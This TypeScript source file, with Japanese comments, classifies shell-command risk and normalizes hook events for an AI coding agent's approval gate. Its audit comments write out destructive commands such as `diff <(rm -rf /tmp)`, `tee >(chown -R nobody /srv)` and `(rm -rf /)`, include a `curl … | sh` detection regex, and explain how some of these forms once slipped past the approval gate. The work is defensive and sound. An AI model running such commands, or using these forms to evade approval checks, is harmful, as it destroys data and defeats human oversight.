  //   TDA-CQ5-4 (R5 監査) の訂正: R4 の redirect 除去モデル以降、**primary 分割は `<(` の中身を
  //   segment に残さない** (`diff <(rm -rf /tmp)` → ["diff  -rf /tmp) x"])。旧コメントの
  //   「`<`/`>` で分割されるので (B) でも拾える」は成立しない。この経路と、legacy 分割を走る
  //   high-only union backstop が検出の担い手であり、後者が**唯一の**検出源になるケースがある。
  const procSubExecutor = launchesShellWithProcessSubstitution(command, split);
  if (procSubExecutor) {
    categories?.add("inline-code"); // プロセス置換を実行/source するシェル起動 = 動的コード実行。
    if (depth < MAX_INLINE_DEPTH)
      bump(reclassifyProcessSubstitution(command, depth, categories, split));
    bump("medium");
  } else if (hasProcessSubstitution(command) && depth < MAX_INLINE_DEPTH) {
    // QA-CQ5-1 (R5 監査 H・本ブランチ起因の回帰): 起動が benign (diff/cat/tee/wc) でも
    //   **inner の named category を emit** する。
    //   (R6 時点では戻り値 risk を捨て verdict を low のまま保っていたが、SEC-R6-2 で
    //    「inner が non-low なら verdict も上げる」へ改訂した — 下の bump を参照。
    //    inner が low なら据え置きなので benign な process-sub の FP は増えない。)
    //   なぜ必要か: bypass/YOLO ゲートは risk 非依存の **category 駆動**
    //   (`matchedPolicyCategories = classifyCommandCategories(cmd) ∩ enabled`) ゆえ、
    //   category が空だと `behavior:"defer"` = 承認カード無しで実行される。R4 の redirect
    //   除去モデル以降、primary 分割が `<(...)` の中身を segment に残さなくなり、
    //   high-only union backstop も non-high な inner を救えないため、base で
    //   `recursive-rm` / `perm-change` が付いていた形 (`cat <(find /tmp -delete)` /
    //   `tee >(chown -R nobody /srv)`) が丸ごと de-gate されていた。
    //
    // **SEC-R6-2 (R6 監査 H) の追加**: category だけでは**通常モード**が守れない。
    //   `requiresDestructiveApproval` は `risk !== "low"` ちょうどを見るため、risk を据え置くと
    //   破壊的 inner が常に無カードで通る (`tee >(chown -R nobody /srv)` は不可逆な chown を実行)。
    //   R6 裁定 019ffe0c の解決契約: **inner が non-low に分類されたときのみ risk を上げる**
    //   (`reclassifyProcessSubstitution` は inner が low なら undefined を返すので、
    //   `diff <(ls) <(ls)` のような benign は low のまま = R5 が守った FP 非再発と両立する)。
    bump(reclassifyProcessSubstitution(command, depth, categories, split));
  }
  // process-sub があるが起動がベニーン (diff/cat 等 = 中身を実行しない) なら (D) の medium 床上げを
  //   抑止して low を維持する (over-gate 防止)。内側が high のときは依然 high を拾う
  //   (`diff <(rm -rf /tmp)` — ただし上記のとおり検出源は legacy union 側)。
  //   既知の限界 (TDA-CQ5-7・pre-existing): このフラグは **command 全体**で 1 回決まり全 segment に
  //   適用されるため、`diff <(ls) ; $X -rf /tmp/x` のように無害な process-sub 前置で後続 segment の
  //   fail-safe 床上げまで無効化できる (base/R4/R5 で同一・追跡 task)。
  //   **抑止条件は quote-aware な実在判定で行う (TDA-CQ9-3・R9 監査 M)**: 字面の
  //   `hasProcessSubstitution` で条件付けると、引用内リテラルだけで fail-safe 床が外れた
  //   (`grep -rn '<(' . ; $X -rf /tmp/x` が low[] = 両モードで無カード)。抑止 (= de-gate) を
  //   決めてよいのは**実際に置換がある**ときだけ。判定は収集器の単一出所を共有する。
  const suppressGroupingMedium =
    collectSubstitutionInners(command, "process").starts.length > 0 && !procSubExecutor;

  for (const seg of segments) {
    const rawTokens = tokenize(seg);
    if (rawTokens.length === 0) {
      // トークンが無くても置換 `$(...)`/backtick だけのセグメントは SEC-1 でゲートする。
      if (hasLiveCommandSubstitution(seg)) {
        bump("medium");
        categories?.add("inline-code");
      }
      continue;
    }
    // 再監査#4 round2 (D): 先頭がシェルメタ文字 ( { $ < > 等でクリーンな実行可能名に正規化できない
    //   セグメントは構造判定不能 → grouping を剥がして内側を再分類 (high を拾う)、不能なら medium 床上げ。
    //   `(rm -rf /)` / `{ rm -rf /; }` / `(sh)` / `$X -rf /` を一括捕捉。
    bump(unanalyzableSegmentRisk(rawTokens, seg, depth, suppressGroupingMedium, categories, split));
    // SEC-1 (round D 再監査): bare な先頭 env 代入 (`FOO=bar rm -rf /`) は RUNNER_WRAPPERS に無く
    //   commandName が `FOO=bar` を返すため、全構造述語が実コマンドを取りこぼし承認ゲートを素通り
    //   させていた。構造判定の前に先頭代入を skip し、ラッパ剥がしと同列に正規化する (skip 後に剥がす)。
    // 再#3 QA-1/QA-3: env / timeout / sudo 等の runner ラッパを再帰的に剥がし、配下の実コマンドを判定対象に。
    //   導出鎖は正準 `programTokens` (前置語 skip → ラッパ剥がし) を共有する (TDA-CQ11-4)。
    const { tokens, capExhausted, unknownOption } = programTokens(rawTokens);
    if (tokens.length === 0) continue;
    // コマンド語が置換 (`` `echo rm` -rf /srv ``) なら、平坦化した形の分類を**加算**する (SEC-CQ11-1)。
    if (hasCommandWordSubstitution(tokens[0]) && depth < MAX_INLINE_DEPTH) {
      bump(
        classifyCommandRiskInternal(flattenCommandSubstitutions(seg), depth + 1, categories, split),
      );
    }
    // 多重ラッパで実コマンドを剥がし上限の奥に隠した疑い → 分類不能として gated (medium) に倒す。
    if (capExhausted || unknownOption) {
      // ラッパ多重 / 表に無い分離 long option (R18 H): 実コマンドが静的に決まらない → 床。
      bump("medium");
      categories?.add("high-risk-other");
    }
    // 各破壊述語を個別評価し category を付与する (短絡せず・どの述語が当たったか category へ反映)。
    let segHigh = false;
    if (isRecursiveForcedRm(tokens)) {
      categories?.add("recursive-rm");
      segHigh = true;
    }
    if (isForcedGitPush(tokens) || isDestructiveGitWorktreeRewrite(tokens)) {
      categories?.add("history-rewrite");
      segHigh = true;
    }
    if (definesShellGitAlias(tokens)) {
      categories?.add("inline-code");
      segHigh = true;
    }
    if (isDangerousChmod(tokens)) {
      categories?.add("perm-change");
      segHigh = true;
    }
    if (writesBlockDevice(seg, tokens)) {
      categories?.add("disk-destroy");
      segHigh = true;
    }
    if (isDestructiveDiskProgram(tokens)) {
      categories?.add("disk-destroy"); // SEC-7: wipefs/mke2fs/blkdiscard/sfdisk/parted/cryptsetup…
      segHigh = true;
    }
    if (isDestructiveDiskSubcommand(tokens)) {
      categories?.add("disk-destroy"); // SEC-3: nvme format / zpool destroy / zfs destroy / hdparm --security-erase…
      segHigh = true;
    }
    if (segHigh) bump("high");
    // QA-3: find の破壊オプション (-delete / -exec) / chown -R はゲート対象 (medium 以上)。
    const findRisk = findDestructiveRisk(tokens);
    if (findRisk !== undefined) {
      categories?.add("recursive-rm"); // mass file 削除 / 任意 exec を recursive-rm カテゴリに集約。
      bump(findRisk);
    }
    if (isRecursiveChown(tokens)) {
      categories?.add("perm-change");
      bump("medium");
    }
    // SEC-1: シェル/インタプリタのインラインコード + コマンド置換 (stripRunnerWrappers 後の実コマンドに対して)。
    bump(inlineCodeRisk(tokens, seg, depth, categories, split));
  }

  if (risk !== "low") return risk;
  // SEC-11 (round D 再監査): 権限昇格ラッパは sudo と対称に medium 床上げする (doas/pkexec/run0 を追加)。
  //   `su` は短く一般語 (su.txt 等) の部分一致で誤爆するため字面床上げには含めない (配下が破壊的なら
  //   構造述語が high を返すので leak にはならない・昇格自体の per-invocation 床上げのみの差)。
  if (/\b(sudo|doas|pkexec|run0)\b|\bcurl\b.*\|\s*(sh|bash)|npm\s+publish/i.test(command)) {
    if (/\bcurl\b.*\|\s*(sh|bash)/i.test(command)) categories?.add("inline-code"); // 供給鎖 RCE (`curl … | sh`)。
    return "medium";
  }
  return "low";
}

/** ツール名から「種別」を判定 (Bash / Edit系 / MCP / WebSearch / その他)。 */
type ToolKind = "bash" | "edit" | "mcp" | "websearch" | "other";
export function classifyTool(toolName: string): ToolKind {
  if (toolName === "Bash" || toolName === "BashOutput") return "bash";
  if (
    toolName === "Edit" ||
    toolName === "Write" ||
    toolName === "MultiEdit" ||
    toolName === "NotebookEdit"
  )
    return "edit";
  if (toolName.startsWith("mcp__")) return "mcp";
  if (toolName === "WebSearch" || toolName === "WebFetch") return "websearch";
  return "other";
}

/** mcp__server__tool → { server, tool }。 */
function parseMcpToolName(toolName: string): { server: string; tool: string } {
  const parts = toolName.split("__");
  return { server: parts[1] ?? "unknown", tool: parts.slice(2).join("__") || "unknown" };
}

function asString(v: unknown): string | undefined {
  return typeof v === "string" ? v : undefined;
}

/**
 * 空文字も undefined に倒す string ガード。
 *
 * `asString("") === ""` のため `asString(x) ?? fallback` は **空文字を素通り**させる
 * (?? は null/undefined しか捕まえない穴)。agent_type のように「空 = 値なし」とみなす
 * フィールドはこちらを使い、空文字を欠落と同一視する (INV-SUBAGENT-BOUNDARY)。
 */
function nonEmptyString(v: unknown): string | undefined {
  return typeof v === "string" && v.length > 0 ? v : undefined;
}

/**
 * 有限数値ガード。NaN/Infinity/数値以外は undefined に倒す。
 *
 * exit_code のように「実在が確認できたもののみ載せる (捏造禁止)」フィールドで使う。
 * CC の PostToolUse `tool_response.exit_code` は実観測上 number だが、CC バージョン差で
 * 欠落・非数値になりうるため、number かつ有限のときだけ採用し、欠落時は **0 を捏造しない**。
 */
function asFiniteNumber(v: unknown): number | undefined {
  return typeof v === "number" && Number.isFinite(v) ? v : undefined;
}

/**
 * command ライフサイクル相関キーのプレフィックス (started↔completed を結ぶ共有キー)。
 *
 * 出所は CC hook の `tool_use_id` (実観測 `toolu_<id>`、PreToolUse/PostToolUse 共通)。
 * 承認 request_id は `<session_id>:<base64url 乱数>` 形式 (`:` を含む) なので、本キーは
 * `tu:` プレフィックスで **キー空間を明示分離**し、両者が同じ `request_id` フィールドに
 * 載っても突合ロジックが取り違えない (cross-namespace collision を構造的に防ぐ)。
 * tool_use_id が欠落/空なら undefined を返し、相関キーを載せない (捏造しない)。
 */
function toolUseCorrelationId(input: HookCommonInput): string | undefined {
  const id = nonEmptyString(input.tool_use_id);
  return id !== undefined ? `tu:${id}` : undefined;
}

/**
 * 表示用に 1 行へ畳んで上限長で切り詰める。
 *
 * 3#SEC-2 (truncation-before-redaction): **切り詰めの前に redaction を適用**する。
 * normalize は EventSink.emit の前段で走るため、ここで生 command/text を先に slice すると
 * MAX_REDACT_INPUT / max 境界を跨ぐ secret 断片 (例: `ghp_…` が最小長ルール未満まで切られる)
 * が emit 後の redactDeep でも未マッチのまま summary/payload に残留しうる。よって
 * **redactString → 1 行化 → slice** の順にして、切り詰める時点で値が既にマスク済みである
 * ことを保証する (INV-REDACTION の順序: redact→persist→send を normalize 段でも先取り)。
 *
 * ── gemini adapter summarize との意図的 dup (TDA-3) ────────────────────────────────────────────
 * `docs/examples/gemini-adapter/adapter.mjs` の `summarize` は **依存ゼロで redact できない**ため、
 * こちらのように redact 先行はできない。代わりに「adapter では secret を分割しない (小 cap で truncate
 * せず sanity 上限のみ) + 表示 ≤N 有界化は床の後 (backend projection)」で同じ straddle 安全性を得る
 * (SEC-1 019f47f0)。CC 経路 (本関数) は redactString 先行ゆえ床に依らず単体で安全。両者は意図的 dup
 * (redact 可 vs 依存ゼロ) で、bound 契約 (単一行・連続空白畳み・ellipsis・summary キー名) を揃える。
 */
function summarize(s: string, max = 120): string {
  const masked = redactString(s);
  const oneLine = masked.replace(/\s+/g, " ").trim();
  return oneLine.length > max ? oneLine.slice(0, max) + "…" : oneLine;
}

/** work item の subject/description 表示上限。projection の boundTurnSummary が更に display bound する。 */
const MAX_WORK_ITEM_TEXT = 200;

/**
 * work item の自由文 (task subject/description) を **redact-first で 1 行・上限化**する (ADR 0015 §D10)。
 *
 * summarize (redactString → 1 行 → slice) を通すため、切り詰めが値をマスクした後に起きる
 * (INV-REDACTION-SUMMARY-STRADDLE と同じ順序で境界跨ぎ secret 断片を残さない)。加えて全候補は
 * EventSink.emit の redactDeep choke も通る (defense-in-depth・新経路で choke を迂回しない)。
 * 空/非文字列は undefined (欠落は載せない = fold が既存値を消さない・NO-RAW)。
 */
function workItemText(v: unknown): string | undefined {
  const s = nonEmptyString(v);
  return s !== undefined ? summarize(s, MAX_WORK_ITEM_TEXT) : undefined;
}

// CC task 観測の raw status → `WorkItemStatus` gate は event-model の正準 `coerceWorkItemStatus` を使う
// (TDA-B2-1: 4 site 手書きコピー廃止・単一出所)。live 検証 (2026-08-04) の TaskUpdate status
// (pending/in_progress/completed) は全て有効値・未知は "unknown" へ安全側。

/**
 * `work.item.updated` payload を組む (ADR 0015 §D2/§D7・carriage point 2)。
 *
 * method は CC の全 task 観測経路で `official_hook` (専用 hook も PostToolUse 記録も CC 公式 hook 経由)。
 * fidelity のみ経路で分岐する (専用 hook=observed / PostToolUse parse=parsed)。fold (work-items.ts) が
 * 最高 fidelity へ claim を昇格し二重ソースを 1 claim に畳む (§D5・受入 6)。
 * id は sidecar で採番しない — provider_task_id を載せ、projection の fold が deriveWorkItemId で導出する
 * (§D3: raw を id/DOM へ持ち込まない)。subject/description は workItemText で redact-first 済。
 */
function workItemPayload(
  providerTaskId: string,
  status: WorkItemStatus,
  subject: string | undefined,
  description: string | undefined,
  fidelity: "observed" | "parsed",
): Record<string, unknown> {
  return {
    provider_task_id: providerTaskId,
    status,
    ...(subject !== undefined ? { subject } : {}),
    ...(description !== undefined ? { description } : {}),
    observation: { method: "official_hook", fidelity },
  };
}

/**
 * 1 件の hook 入力を 0..N 件の NormalizedEvent 候補へ正規化する。
 * 多くは 1 件だが、将来 batch hook 等で複数化しうるため配列で返す。
 *
 * approvalRequestId: PermissionRequest 時に承認ブリッジが採番した相関 ID を
 * summary 兼 payload に乗せて UI 側で突合できるようにする (任意)。
 */
export interface NormalizeContext {
  readonly approvalRequestId?: string;
  /**
   * 自動ガード (ADR 019ecc70 段階1・D3/D4): なぜ pause したか。approvalRequestId と並んで渡し、
   * `tool.permission.requested` payload の `trigger` に載せる (additive optional)。
   */
  readonly guardTrigger?: "destructive" | "secret" | "both";
  /**
   * 自動ガード (ADR 019ecc70 D3): secret-trigger の kind 名 (REDACTION_KINDS allowlist のみ)。
   * INV-AUTOGUARD-NO-RAW: 原文ゼロ。`tool.permission.requested` payload の `secret_kinds` に載せる。
   */
  readonly guardSecretKinds?: readonly string[];
  /**
   * SEC-2 (ADR 019e9b89): allow_for_session の同一署名キャッシュ命中で **auto-allow** された
   * 高リスク操作のとき true。PreToolUse の観測 payload に `auto_allowed: true` を付け、監査ログで
   * 「session-grant 由来の自動許可」を low-risk defer と識別可能にする (over-allow ではない)。
   */
  readonly autoAllowed?: boolean;
  /**
   * ADR 019ee0c0: この承認要求が永続 allowlist 対象 (medium-bash + 非 secret + repo 解決可 +
   * feature-ON) のとき true。`tool.permission.requested` payload の `persistable` に載せ、UI が
   * 「再起動後も許可」を提示するか決める根拠にする (additive optional)。
   */
  readonly guardPersistable?: boolean;
  /**
   * ADR 019ee0c0: 永続 allowlist のディスク署名命中で auto-allow されたとき true。autoAllowed と
   * 並んで PreToolUse 観測 payload に `persist_grant: true` を付け、「再起動跨ぎ grant 由来の自動許可」を
   * session-grant (auto_allowed のみ) と監査識別可能にする。
   */
  readonly persistGrant?: boolean;
  /**
   * 観測モード (ADR 019ea476 D8)。Attach 経路の hook 正規化では "attach" を渡し、
   * 全候補イベントに capture_mode="attach" を付与する。省略時は付与しない (managed 既定扱い)。
   * event-model CaptureMode の**意図的 narrow** (hook 経路は codex_rollout を通らない・TDA-1)。
   */
  readonly captureMode?: "managed" | "attach";
  /**
   * ADR 0014 Phase 3b-1 (D5): RunIdentity が解決した canonical run id。設定時は全候補の session_id に
   * これを載せる (input.session_id 直載せから切替)。省略時は後方互換で input.session_id を使う。
   * common case は input.session_id と同値・terminal-reopen synthetic のみ乖離する。
   */
  readonly canonicalSessionId?: string;
  /**
   * ADR 0014 Phase 3b-1 (D4): provider の raw session id。全候補の provider_session_id に載せる。
   * 省略時は input.session_id を出所とする (common case で session_id と同値・従来 NULL からの populate)。
   */
  readonly providerSessionId?: string;
  /**
   * ADR 0014 Phase 3b-1 (D4): run 起点の開始種別。RunIdentity が境界 (or generation 0) を検出した
   * hook でのみ渡す。全候補の start_kind に載せる (backend first-wins で run 起点に確定)。
   */
  readonly runStartKind?: StartKind;
  /**
   * ADR 0014 Phase 3b-1 (D4): resume run の継続元 canonical session_id。親 run を観測した境界でのみ渡す
   * (over-claim しない)。全候補の resumed_from_session_id に載せる。
   */
  readonly resumedFromSessionId?: string;
}

/**
 * ADR 0014 Phase 3b-1 (D4): SessionEnd の `reason` を EndKind closed-enum へ写像する。
 * Claude Code hooks の reason は `clear` / `logout` / `prompt_input_exit` / `other` (版依存で増減しうる)。
 *  - clear → cleared (会話クリアで終端)
 *  - logout → logout (認証喪失/ログアウト)
 *  - prompt_input_exit → completed (通常終了)
 *  - 上記以外 → other (明示終端だが分類不能・over-claim しない)。
 * 未知 reason は "other" へ倒す (silent に completed へ寄せない = 誤 completed を作らない)。
 */
function endKindForSessionEndReason(reason: string): EndKind {
  switch (reason) {
    case "clear":
      return "cleared";
    case "logout":
      return "logout";
    case "prompt_input_exit":
      return "completed";
    default:
      return "other";
  }
}

export function normalizeHook(
  input: HookCommonInput,
  ctx: NormalizeContext = {},
): ReturnType<typeof buildEvent>[] {
  // ADR 0014 Phase 3b-1 (D4/D5): session_id は RunIdentity 解決の canonical、provider_session_id は
  //   provider raw id (従来 NULL からの populate)。start_kind/resumed_from は境界 hook のみ ctx で渡り、
  //   全候補 (= run 起点イベント群) に載る。common case は canonical === provider === input.session_id。
  const base: Pick<
    BuildEventInput,
    | "session_id"
    | "provider_session_id"
    | "start_kind"
    | "resumed_from_session_id"
    | "cwd"
    | "agent_id"
    | "capture_mode"
    | "permission_mode"
  > = {
    session_id: ctx.canonicalSessionId ?? input.session_id,
    provider_session_id: ctx.providerSessionId ?? input.session_id,
    // 3b-1 sweep TDA-3 (accepted edge): start_kind は全候補に載るため、run の初観測 hook が
    // SessionEnd のとき session.ended が start_kind(unknown) を持ちうる。無害 — backend first-wins
    // が「起点未観測 = unknown」を正直に記録するだけで、over-claim も上書きも起きない。
    ...(ctx.runStartKind !== undefined ? { start_kind: ctx.runStartKind } : {}),
    ...(ctx.resumedFromSessionId !== undefined
      ? { resumed_from_session_id: ctx.resumedFromSessionId }
      : {}),
    ...(input.cwd !== undefined ? { cwd: input.cwd } : {}),
    ...(input.agent_id !== undefined ? { agent_id: input.agent_id } : {}),
    ...(ctx.captureMode !== undefined ? { capture_mode: ctx.captureMode } : {}),
    // 段階2 (ADR 019ea4ba D3): hook の permission_mode を投影 (sandbox 表示・後方互換 optional)。
    ...(typeof input.permission_mode === "string" && input.permission_mode.length > 0
      ? { permission_mode: input.permission_mode }
      : {}),
  };

  const make = (
    event_type: EventType,
    state: State | undefined,
    extra: {
      summary?: string;
      payload?: Record<string, unknown>;
      turn_id?: string;
      // ADR 0014 Phase 3b-1 (D4): run 終端イベント (session.ended) のみに載せる終了種別/再開可能性。
      endKind?: EndKind;
      recoverability?: Continuation;
    } = {},
  ): ReturnType<typeof buildEvent> =>
    buildEvent({
      ...base,
      // 通常の Claude hook 経路は ApprovalBridge が実行前に介在する。bypassPermissions は
      // per-repo policy の有効性を同期 normalizer だけでは確定できないため unavailable とし、
      // protected を過大計上しない。保証宣言は run 起点だけに載せる。
      ...(event_type === "session.started"
        ? { governance_mode: governanceModeFor(input.permission_mode) }
        : {}),
      event_type,
      ...(state !== undefined ? { state } : {}),
      ...(extra.summary !== undefined ? { summary: extra.summary } : {}),
      ...(extra.turn_id !== undefined ? { turn_id: extra.turn_id } : {}),
      ...(extra.endKind !== undefined ? { end_kind: extra.endKind } : {}),
      ...(extra.recoverability !== undefined ? { recoverability: extra.recoverability } : {}),
      payload: { kind: event_type, ...(extra.payload ?? {}) },
    });

  switch (input.hook_event_name) {
    case "SessionStart": {
      const source = asString(input.source);
      return [
        make("session.started", "starting", {
          summary: `セッション開始 (${source ?? "startup"})`,
          payload: { ...(input.cwd ? { repo: input.cwd } : {}), ...(source ? { source } : {}) },
        }),
      ];
    }

    case "UserPromptSubmit": {
      const prompt = asString(input.prompt) ?? "";
      return [
        make("turn.started", "running.model_wait", {
          summary: prompt ? `依頼: ${summarize(prompt)}` : "ユーザー依頼",
          payload: { prompt_summary: summarize(prompt, 200) },
        }),
      ];
    }

    case "PreToolUse": {
      const toolName = asString(input.tool_name) ?? "unknown";
      const toolInput = (input.tool_input ?? {}) as ToolInput;
      const kind = classifyTool(toolName);

      // ADR 019e9999 (中心的所見): PreToolUse がゲート対象 (高リスク) のとき、承認ブリッジは
      // ingest(input, requestId) で approvalRequestId を渡す (low-risk は defer で渡さない)。
      // この場合は command.started 等 (running.*) ではなく **request_id 付き
      // tool.permission.requested (waiting.approval)** を emit し、UI が承認カードを出して
      // approve frame に request_id を載せられるようにする。これが無いと最頻の高リスク経路
      // (auto/bypass の rm -rf 等) で UI は承認待ちすら見えなかった (INV-APPROVAL-PRETOOLUSE-EMIT)。
      // command は summarize(redact→1行→slice) で redaction 済み。path は生載せだが、
      // 全イベントは EventSink.emit の choke point で redactDeep を通ってから保存・送信される
      // (SEC-3 訂正: path の redaction は summarize でなく sink.redactDeep が担保)。
      if (ctx.approvalRequestId !== undefined) {
        const payload: Record<string, unknown> = {
          request_id: ctx.approvalRequestId,
          tool_name: toolName,
        };
        // 自動ガード (ADR 019ecc70 D3/D4): なぜ pause したか / secret kind を載せる (additive)。
        // secret_kinds は非空のときのみ (空配列は付けない)。原文は載らない (kind 名のみ・上流で allowlist 済)。
        if (ctx.guardTrigger !== undefined) payload.trigger = ctx.guardTrigger;
        if (ctx.guardSecretKinds !== undefined && ctx.guardSecretKinds.length > 0) {
          payload.secret_kinds = [...ctx.guardSecretKinds];
        }
        // ADR 019ee0c0: 永続化可能なときのみ persistable=true を載せる (UI が「再起動後も許可」を出す根拠)。
        if (ctx.guardPersistable === true) payload.persistable = true;
        let summary = `承認待ち: ${toolName}`;
        if (kind === "bash") {
          const command = asString(toolInput.command) ?? "";
          payload.command = summarize(command, MAX_COMMAND_LEN);
          payload.risk_level = classifyCommandRisk(command);
          summary = `承認待ち: ${toolName} (${summarize(command, 60)})`;
        } else if (kind === "edit") {
          const path = asString(toolInput.file_path) ?? "unknown";
          payload.path = path;
          summary = `承認待ち: ${toolName} (${path})`;
        } else if (kind === "mcp") {
          const { server, tool } = parseMcpToolName(toolName);
          summary = `承認待ち: MCP ${server}/${tool}`;
        }
        return [make("tool.permission.requested", "waiting.approval", { summary, payload })];
      }

      // SEC-2: allow_for_session の同一署名 auto-allow 経由の観測には auto_allowed マーカーを付け、
      // 監査ログで「session-grant 由来の自動許可」を low-risk defer と識別可能にする (over-allow でない)。
      // SEC-2 / ADR 019ee0c0: auto-allow 由来を監査識別する。persist_grant は再起動跨ぎ disk grant 由来。
      const autoMark =
        ctx.autoAllowed === true
          ? { auto_allowed: true, ...(ctx.persistGrant === true ? { persist_grant: true } : {}) }
          : {};

      if (kind === "bash") {
        const command = asString(toolInput.command) ?? "";
        const correlationId = toolUseCorrelationId(input);
        return [
          make("command.started", "running.command_executing", {
            summary: `コマンド実行: ${summarize(command, 100)}`,
            payload: {
              // 再#SEC-1: command も無切り詰めで保持しない (巨大入力での redaction/保存負荷を抑制)。
              command: summarize(command, MAX_COMMAND_LEN),
              ...(input.cwd ? { cwd: input.cwd } : {}),
              risk_level: classifyCommandRisk(command),
              // ADR 0015 §D6 (B1): check 分類 (raw command で判定・closed enum のみ)。started 側にも
              //   載せるのは fold の run_dirty 窓 (start↔completed 間の diff 変化) を開くため。
              ...checkFields(command),
              // tool_use_id 由来の相関キー。同じキーを command.completed に載せ started↔completed を結ぶ。
              ...(correlationId !== undefined ? { request_id: correlationId } : {}),
              ...autoMark,
            },
          }),
        ];
      }
      if (kind === "edit") {
        const path = asString(toolInput.file_path) ?? "unknown";
        return [
          make("file.change.proposed", "running.file_editing", {
            summary: `ファイル編集: ${path}`,
            payload: { path, ...autoMark },
          }),
        ];
      }
      if (kind === "mcp") {
        const { server, tool } = parseMcpToolName(toolName);
        return [
          make("mcp.call.started", "running.mcp_tool_calling", {
            summary: `MCP: ${server}/${tool}`,
            payload: { server, tool, ...autoMark },
          }),
        ];
      }
      if (kind === "websearch") {
        const query = asString(toolInput.query) ?? "";
        return [
          make("web.search.started", "running.web_searching", {
            summary: `Web 検索: ${summarize(query, 80)}`,
            payload: { query, ...autoMark },
          }),
        ];
      }
      return [
        make("tool.started", "running.tool_preparing", {
          summary: `ツール: ${toolName}`,
          payload: { tool_name: toolName, ...autoMark },
        }),
      ];
    }

    case "PostToolUse": {
      const toolName = asString(input.tool_name) ?? "unknown";

      // ADR 0015 §D2 (B2): CC の task tool 記録を work.item.updated へ parse する (fidelity=parsed)。
      //   TaskUpdated hook は存在しない (live 検証 2026-08-04) ため、中間遷移 (in_progress / 内容編集 /
      //   cancel) は PostToolUse(TaskCreate/TaskUpdate) の tool 記録でのみ観測できる。**live 検証済み
      //   field のみ** parse する (未検証 field は parse しない契約・ADR 未解決論点 2):
      //   - TaskCreate: tool_input={subject,description,activeForm} (id は無い)・生成 id は
      //     tool_response.task.id・status は生成ゆえ pending。
      //   - TaskUpdate: tool_input={taskId(camelCase),status} (subject は無い)。
      //   専用 hook (TaskCreated/TaskCompleted・observed) と同一 provider_task_id を載せるため、fold が
      //   deriveWorkItemId で同一 work item に畳み二重ソースを 1 claim に統合する (§D5・受入 6)。
      //   generic tool.completed も**併せて** emit し tool.started↔completed の均衡を保つ (非退行)。
      if (toolName === "TaskCreate" || toolName === "TaskUpdate") {
        const toolInput = (input.tool_input ?? {}) as Record<string, unknown>;
        let providerTaskId: string | undefined;
        let status: WorkItemStatus;
        let subject: string | undefined;
        let description: string | undefined;
        if (toolName === "TaskCreate") {
          const toolResponse = (input.tool_response ?? {}) as Record<string, unknown>;
          const task = toolResponse.task;
          providerTaskId =
            typeof task === "object" && task !== null
              ? nonEmptyString((task as Record<string, unknown>).id)
              : undefined;
          status = "pending";
          subject = workItemText(toolInput.subject);
          description = workItemText(toolInput.description);
        } else {
          providerTaskId = nonEmptyString(toolInput.taskId);
          status = coerceWorkItemStatus(toolInput.status);
          // TaskUpdate tool_input は subject/description を載せない (live 検証) → 捏造せず欠落のまま
          //   (fold が既存 subject を保持する)。
          subject = undefined;
          description = undefined;
        }
        const events: ReturnType<typeof buildEvent>[] = [];
        // id 不明 (tool_response.task.id / taskId 欠落) は同定不能ゆえ work item を emit しない。
        if (providerTaskId !== undefined) {
          events.push(
            make("work.item.updated", undefined, {
              summary: `作業項目 ${status}: ${subject ?? providerTaskId}`,
              payload: workItemPayload(providerTaskId, status, subject, description, "parsed"),
            }),
          );
        }
        events.push(
          make("tool.completed", "running.model_wait", {
            summary: `ツール完了: ${toolName}`,
            payload: { tool_name: toolName },
          }),
        );
        return events;
      }

      const kind = classifyTool(toolName);
      if (kind === "bash") {
        // 実観測 (code.claude.com/docs hooks + live probe 2026-06):
        //  - PostToolUse(Bash) は tool_response={stdout,stderr,exit_code(number)}(+任意 interrupted/isImage)。
        //  - tool_use_id は PreToolUse と同一値で運ばれ、started↔completed の相関キー出所。
        // 載せるのは「実在が確認できたもののみ」: exit_code は number のときだけ (0 を捏造しない)。
        // stdout/stderr 本文は載せない (既存の output delta excerpt 経路があり redaction 面を広げない)。
        const toolInput = (input.tool_input ?? {}) as ToolInput;
        const command = asString(toolInput.command);
        const toolResponse = (input.tool_response ?? {}) as Record<string, unknown>;
        const exitCode = asFiniteNumber(toolResponse.exit_code);
        const correlationId = toolUseCorrelationId(input);
        const payload: Record<string, unknown> = {};
        if (exitCode !== undefined) payload.exit_code = exitCode;
        if (command !== undefined) {
          payload.command = summarize(command, MAX_COMMAND_LEN);
          // ADR 0015 §D6 (B1): completed 側の check 分類 (raw command で判定)。exit_code と合わせ
          //   fold の session-global 束縛で verification 遷移を駆動する。command 欠落時は付与しない。
          Object.assign(payload, checkFields(command));
        }
        if (correlationId !== undefined) payload.request_id = correlationId;
        const exitLabel = exitCode !== undefined ? ` (exit ${exitCode})` : "";
        return [
          make("command.completed", "running.model_wait", {
            summary: `コマンド完了: ${toolName}${exitLabel}`,
            payload,
          }),
        ];
      }
      if (kind === "edit") {
        const toolInput = (input.tool_input ?? {}) as ToolInput;
        const path = asString(toolInput.file_path) ?? "unknown";
        return [
          make("file.change.applied", "running.model_wait", {
            summary: `ファイル適用: ${path}`,
            payload: { path },
          }),
        ];
      }
      if (kind === "mcp") {
        const { server, tool } = parseMcpToolName(toolName);
        return [
          make("mcp.call.completed", "running.model_wait", {
            summary: `MCP 完了: ${server}/${tool}`,
            payload: { server, tool },
          }),
        ];
      }
      return [
        make("tool.completed", "running.model_wait", {
          summary: `ツール完了: ${toolName}`,
          payload: { tool_name: toolName },
        }),
      ];
    }

    case "PostToolUseFailure": {
      const toolName = asString(input.tool_name) ?? "unknown";
      // tool_response は string (旧前提) か object のどちらもありうる。Bash 等は
      // {stdout,stderr,exit_code} の object。string ならそのまま errorText、object なら
      // stderr を errorText に採り、exit_code/command/相関キーを PostToolUse と整合させる
      // (実在が確認できたもののみ・捏造しない)。
      const rawResponse = input.tool_response;
      const responseObj =
        rawResponse !== null && typeof rawResponse === "object"
          ? (rawResponse as Record<string, unknown>)
          : undefined;
      const errorText = asString(rawResponse) ?? asString(responseObj?.stderr) ?? "tool failed";
      const toolInput = (input.tool_input ?? {}) as ToolInput;
      const command = asString(toolInput.command);
      const exitCode = asFiniteNumber(responseObj?.exit_code);
      const correlationId = toolUseCorrelationId(input);
      const payload: Record<string, unknown> = {
        tool_name: toolName,
        error: summarize(errorText, 200),
      };
      if (exitCode !== undefined) payload.exit_code = exitCode;
      if (command !== undefined) payload.command = summarize(command, MAX_COMMAND_LEN);
      if (correlationId !== undefined) payload.request_id = correlationId;
      return [
        make("tool.failed", "running.model_wait", {
          summary: `ツール失敗: ${toolName}${exitCode !== undefined ? ` (exit ${exitCode})` : ""}`,
          payload,
        }),
      ];
    }

